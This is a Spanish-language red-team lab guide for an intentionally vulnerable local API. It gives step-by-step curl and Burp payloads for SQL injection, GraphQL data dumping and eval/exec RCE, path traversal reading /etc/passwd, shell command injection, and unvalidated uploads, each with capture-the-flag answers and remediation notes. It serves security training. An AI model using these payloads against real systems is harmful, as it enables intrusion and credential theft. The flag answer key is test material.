# Laboratorio 3 — Inyecciones y RCE (SQLi, Command Injection, GraphQL, Traversal, Upload)

> **Perspectiva red team**: la fase de mayor impacto técnico. Aquí el atacante deja de depender de fallos de diseño y explota **defectos de validación de entrada** para ejecutar código en el host objetivo (RCE), leer archivos del nodo y drenar la base de datos. En todo pentest real, demostrar RCE sobre el contenedor es el "game over" del informe.

**Duración sugerida**: 2.5h · **Dificultad global**: Media (tercer escalón)

> **Orden**: empieza por los accesos **fáciles** (SQLi y GraphQL de lectura) y **sube** a ejecución de comandos. **R15 → R17 → R18** forman una mini-cadena: la lectura de archivos (R15) + subir una "shell" (R17) permiten el RCE de export (R18).

| Reto | Tema | Dificultad |
|---|---|---|
| R13 | SQL Injection en búsqueda de usuarios | Fácil |
| R14 | GraphQL: data exposure masiva | Fácil |
| R15 | Path Traversal (descarga + export) | Fácil–Media |
| R16 | Command Injection en SKU lookup | Media |
| R17 | Upload sin validación → webshell | Media |
| R18 | RCE en /transactions/export | Media |
| R19 | GraphQL: RCE y lectura de archivos | Media |

## Objetivos de aprendizaje
1. Detectar y explotar **SQL Injection** en búsquedas.
2. Conseguir **RCE** por command injection (endpoint de SKU, export de transacciones).
3. Explotar un **GraphQL playground** inseguro: RCE, lectura de archivos, filtros eval, exposure masiva de datos.
4. **Path traversal** y **upload sin validación** → webshell.

**Obtener un JWT genérico** (útil para varios retos):
```bash
JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin123"}' \
  | jq -r .access_token)
```

> **¿Prefieres Burp Suite?** Aquí el fuerte es **Repeater** para inyecciones: pega el payload, asegúrate de **URL-encodear** en query strings (`Ctrl+U`), y usa el tab **Inspector** para ver el valor decodificado al iterar. Para los uploads, `Proxy → Intercept` y edita el `filename`. Config en el **Anexo 7** del `README.md`.

---

## R13 — SQL Injection en búsqueda de usuarios

**OWASP**: API — extras · **Dificultad**: Fácil
**Prerequisitos**: R02 (un JWT válido para `/api/users/search`).

**Objetivo**: inyectar SQL en el `LIKE` para descargar datos de la tabla `user` (password_hash incluido).

**Pasos**
1. Query normal:
   ```bash
   curl -s "http://localhost:5000/api/users/search?q=john" -H "Authorization: Bearer $JWT" | jq
   ```
2. Inyección que anula el filtro (`' OR '1'='1`):
   ```bash
   curl -s "http://localhost:5000/api/users/search?q='%20OR%20'1'='1" -H "Authorization: Bearer $JWT" | jq .result_count
   ```
3. Extra con `UNION` para columnas concretas:
   ```bash
   curl -s "http://localhost:5000/api/users/search?q=%27%20UNION%20SELECT%20id,username,email,password_hash%20FROM%20user--" \
     -H "Authorization: Bearer $JWT"
   ```
   La respuesta adjunta la query ejecutada en `sql_query` (ayuda forense para el estudiante).

**Prueba de éxito**: `result_count` con todos los usuarios y `password_hash` en cada fila.

**Flag**: `FH{sqli-users-search}`

> **Con Burp**: en `Repeater` con `GET /api/users/search?q=<payload>`, URL-encodea los espacios y comillas (`' OR '1'='1` → `'%20OR%20'1'='1`) y envíalo; prueba variantes hasta ver `result_count` alto con `password_hash`.

**Remediación**: ORM con binds/params, no concatenar el input; evitar `text()` con strings de usuario.

---

## R14 — GraphQL: Data exposure masiva

**OWASP**: API — extras · **Dificultad**: Fácil (¡público!)
**Prerequisitos**: ninguno (endpoint público). Conceptualmente prepara R19 (mismo motor GraphQL).

**Objetivo**: extraer **todos** los usuarios y productos (password_hash, emails, balances) sin autenticarse.

**Pasos**
1. Usuarios (el resolver responde si la query contiene `user`):
   ```bash
   curl -s -X POST http://localhost:5000/graphql/query \
     -H 'Content-Type: application/json' -d '{"query":"{ user }"}'
   ```
2. Productos (si contiene `product`):
   ```bash
   curl -s -X POST http://localhost:5000/graphql/query \
     -H 'Content-Type: application/json' -d '{"query":"{ product }"}'
   ```
3. Filtrado evaluando expresiones (contiene `filter` y `users`):
   ```bash
   curl -s -X POST http://localhost:5000/graphql/query \
     -H 'Content-Type: application/json' -d '{"query":"filter users where: user.is_admin == True"}'
   ```
   > Nota de diseño: el dispatcher comprueba `'user' in query` *antes* que `filter`, de modo que cualquier query que contenga `user`/`users` cae en el **handler de data-exposure** y devuelve la tabla completa (todos los usuarios, no solo los filtrados). El intento de "filtrar" es por tanto también una fuga total. ⚠️ El flag `FH{graphql-filter-eval}` corresponde al handler `handle_user_filtering` (eval sobre expresiones del cliente), que **en la práctica es código no alcanzable** desde el dispatcher con esta precedencia de checks — bonificación conceptual: el `eval()` existe en `graphql_vuln.py`, pero para explotarlo hay que llegar por otra vía.

**Prueba de éxito**: respuesta con `data.users` incluyendo `password_hash`, `balance`, `is_admin`; y `data.products` con dueños. El paso 3 vuelca también todos los usuarios (incluidos `is_admin=true`).

**Flag**: `FH{graphql-data-leak}` · `FH{graphql-filter-eval}`

> **Con Burp**: en `Repeater` con `POST /graphql/query` pega los payloads tal cual (JSON no exige encoding): `{ user }`, `{ product }` y variantes con `filter`/`users` para ver la fuga total.

**Remediación**: cerrar el foco GraphQL (no usar un "resolver mágico"), evitar `eval()` sobre expresiones del cliente, y autenticar todos los campos.

---

## R15 — Path Traversal (descarga de archivos + export)

**OWASP**: API1/API7 · **Dificultad**: Fácil–Media
**Prerequisitos**: R02 (JWT para `/api/files`). Alimenta R18 (leer el archivo que luego servirá de runner).

**Objetivo**: leer archivos arbitrarios del servidor mediante `../` en paths.

**Pasos**
1. Vía `/api/files` (requiere JWT y `--path-as-is`): Werkzeug normaliza a 404 los `..` "desnudos" del path de la URL; **encodeando `..` como `%2e%2e`** se bypasea y el handler sirve `/etc/passwd` (`os.path.exists(filename)` no sananea, app.py):
   ```bash
   curl -s --path-as-is "http://localhost:5000/api/files/%2e%2e/%2e%2e/etc/passwd" \
     -H "Authorization: Bearer $JWT" | head -3
   ```
   > El handler además intenta `os.path.exists(filename)` con rutas absolutas/relativas directas; `GET /api/files//etc/passwd` devuelve 308/404 según la variante.
2. Vía `/transactions/export` (público, sin auth) — aquí `..` normal funciona porque va en el **query string**, no en el path:
   ```bash
   curl -s "http://localhost:5000/transactions/export?filename=../../etc/passwd" | head -3
   ```

**Prueba de éxito**: contenido de `/etc/passwd` en ambos (el primero con `%2e%2e` y `--path-as-is`).

**Flag**: `FH{path-traversal-files}` · `FH{pt-transactions-export}`

> **Con Burp**: el primer vector requiere `%2e%2e` en el *path*; desactiva en *Project options → HTTP* la normalización de paths y envía `/api/files/%2e%2e/%2e%2e/etc/passwd`. El segundo va en el *query string* (`filename=../../etc/passwd`) — URL-encodea los `/` si Burp te los corrige.

**Remediación**: usar `secure_filename` + `os.path.realpath(...).startswith(UPLOAD_DIR)`; servir con `send_from_directory`.

---

## R16 — Command Injection en SKU lookup

**OWASP**: API — extras · **Dificultad**: Media
**Prerequisitos**: R02 (JWT). R01 para localizar el endpoint en Swagger.

**Objetivo**: RCE a través del parámetro `sku`, que se ejecuta con `shell=True`.

**Pasos**
1. Comando simple:
   ```bash
   curl -s -X POST http://localhost:5000/api/inventory/sku-lookup \
     -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
     -d '{"sku":"id"}'
   ```
2. Lectura de archivos o cadena de comandos:
   ```bash
   curl -s -X POST http://localhost:5000/api/inventory/sku-lookup \
     -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
     -d '{"sku":"cat /etc/passwd | head -3"}'
   ```

**Prueba de éxito**: `{"output":"uid=0(root) gid=0(root) groups=0(root)\n"}` → **RCE as root** en el contenedor.

**Flag**: `FH{rce-sku-lookup}`

> **Con Burp**: `POST /api/inventory/sku-lookup` en `Repeater` con body `{"sku":"cat /etc/passwd | head -3"}` — el JSON manda el comando sin encoding. Prueba con `id` primero y observa `"output"`.

**Remediación**: nunca usar `shell=True` con input de usuario; validar el SKU contra un formato estricto o consultar en BD.

---

## R17 — Upload sin validación → webshell

**OWASP**: API — extras · **Dificultad**: Media
**Prerequisitos**: R02 (JWT). Alimenta R18 (la "shell" subida es el `filename` que ejecutará `cmd`).

**Objetivo**: subir un archivo malicioso sin control de tipo y servirlo/ejecutarlo.

**Pasos**
1. Crea un "webshell" simple:
   ```bash
   printf '== SESAME ==\n' > /tmp/shell.txt
   ```
2. Súbelo por `/api/upload` (usa `secure_filename` pero **no valida tipo/extensión**):
   ```bash
   curl -s -X POST http://localhost:5000/api/upload -H "Authorization: Bearer $JWT" \
     -F "file=@/tmp/shell.txt"
   ```
3. Recupéralo y sirve el binario/archivo:
   ```bash
   curl -s "http://localhost:5000/api/files/shell.txt" -H "Authorization: Bearer $JWT"
   ```
4. (Variante) `POST /api/products/<id>/upload` con un nombre con `../` para path traversal al grabar:
   ```bash
   printf 'pwn' > /tmp/x.txt
   curl -s -X POST "http://localhost:5000/api/products/1/upload" -H "Authorization: Bearer $JWT" \
     -F "file=@/tmp/x.txt;filename=../../../tmp/pwned.txt"
   ```

**Prueba de éxito**: `{"message":"File uploaded successfully","path":"uploads/shell.txt"}` y el contenido se puede leer en `/api/files/shell.txt`.
> Nota de la variante de traversal: el nombre con `../` **escapa del directorio `uploads/`**, pero el destino exacto depende del CWD del servidor (p. ej. con CWD=`/app` aterriza en `/tmp/pwned.txt`; ejecutando en desarrollo puede quedar en `<CWD>/../tmp/pwned.txt`). La prueba real del fallo es que el archivo termina fuera de `uploads/`.

**Flag**: `FH{insecure-file-upload}` · (variante traversal) `FH{upload-path-traversal}`

> **Con Burp**: activa `Proxy → Intercept`, sube el archivo desde la UI del lab (`/upload`) y **edita el multipart** en caliente: cambia `filename="shell.txt"` por un nombre con `../` para la variante traversal. Luego `GET /api/files/shell.txt` en `Repeater` para confirmar.

**Remediación**: validar extensión/MIME real (magic bytes), tamaño, y guardar con nombre aleatorio en location fuera del webroot.

---

## R18 — RCE en /transactions/export (público, sin auth)

**OWASP**: API7/API8 · **Dificultad**: Media
**Prerequisitos**: R17 (subir el archivo que servirá de `filename`) y R15 (leer cualquier archivo con el mismo endpoint). 

**Objetivo**: ejecutar comandos arbitrarios con el parámetro `cmd` (y runner `bash`/`python`) sin autenticarse.

**Pasos**
1. Explotación de lectura de archivos (path traversal) — ver también R15:
   ```bash
   curl -s "http://localhost:5000/transactions/export?filename=../../etc/passwd" | head -3
   ```
2. RCE combinando un archivo que exista + `cmd`:
   ```bash
   curl -s "http://localhost:5000/transactions/export?filename=test.csv?cmd=id&runner=bash"
   ```
   > Nota: `filename` debe apuntar a un archivo **existente** bajo el dir de export (`uploads/`). Sube primero un archivo (R17) y luego úsalo como `filename` para ejecutar `cmd`.
   ```bash
   curl -s -X POST http://localhost:5000/api/upload -H "Authorization: Bearer $JWT" \
     -F "file=@/tmp/a.txt"
   curl -s "http://localhost:5000/transactions/export?filename=a.txt?cmd=id&runner=bash"
   ```

**Prueba de éxito**: `GET /transactions/export?filename=../../etc/passwd` devuelve el contenido de `/etc/passwd` **sin auth**; con `cmd=id` responde la salida de `id`.

**Flag**: `FH{rce-transactions-export}` (+ `FH{pt-transactions-export}` con la de R15)

> **Con Burp**: `GET /transactions/export?filename=a.txt?cmd=id&runner=bash` en `Repeater` (primero sube `a.txt` para que `filename` exista). Como el `?` del payload va en el query, URL-encodea la interrogación si hace falta y verás `"output"` con la salida de `id`.

**Remediación**: sanitizar `filename`, nunca ejecutar `cmd`, restringir por autenticación.

---

## R19 — GraphQL: RCE y lectura de archivos

**OWASP**: API — extras · **Dificultad**: Media
**Prerequisitos**: R14 (mismo motor/playground GraphQL y sus respuestas de `data.output`/`data.content`).

**Objetivo**: ejecutar código Python/OS y leer archivos del nodo vía GraphQL (sin auth).

**Pasos**
1. Ejecución Python (`exec`):
   ```bash
   curl -s -X POST http://localhost:5000/graphql/query \
     -H 'Content-Type: application/json' \
     -d '{"query":"exec(\"print(38*7)\")"}'
   ```
2. `eval`:
   ```bash
   curl -s -X POST http://localhost:5000/graphql/query \
     -H 'Content-Type: application/json' -d '{"query":"eval(\"__import__(\\\"os\\\").system(\\\"id\\\")\")"}'
   ```
3. Comandos OS:
   ```bash
   curl -s -X POST http://localhost:5000/graphql/query \
     -H 'Content-Type: application/json' -d '{"query":"import os; os.system(\"id\")"}'
   ```
4. Lectura de archivos:
   ```bash
   curl -s -X POST http://localhost:5000/graphql/query \
     -H 'Content-Type: application/json' -d '{"query":"open(\"/etc/passwd\").read()"}'
   ```
5. (Opcional) Descubre todo el esquema:
   ```bash
   curl -s -X POST http://localhost:5000/graphql/query \
     -H 'Content-Type: application/json' -d '{"query":"{ __schema { types { name } } }"}'
   ```

**Prueba de éxito**: `data.output: "266\n"` para `print(38*7)`; `data.content` con el inicio de `/etc/passwd`; `data.command` con `"executed"`.

**Flag**: `FH{graphql-rce}` · `FH{graphql-file-read}`

> **Con Burp**: `POST /graphql/query` en `Repeater` con payloads: `exec("print(38*7)")`, `import os; os.system("id")`, `open("/etc/passwd").read()`. Fíjate en `data.output`/`data.content`.

**Remediación**: parsear el query con un motor GraphQL real (esto es *unsafe consumption*): desactivar `eval`/`exec`, limitar tipos de campos y filtrar el acceso.

---

## Resumen de flags — Laboratorio 3

| Reto | Flag |
|---|---|
| R13 | `FH{sqli-users-search}` |
| R14 | `FH{graphql-data-leak}` + `FH{graphql-filter-eval}` |
| R15 | `FH{path-traversal-files}` + `FH{pt-transactions-export}` |
| R16 | `FH{rce-sku-lookup}` |
| R17 | `FH{insecure-file-upload}` (+ `FH{upload-path-traversal}`) |
| R18 | `FH{rce-transactions-export}` (+ `FH{pt-transactions-export}` con R15) |
| R19 | `FH{graphql-rce}` + `FH{graphql-file-read}` |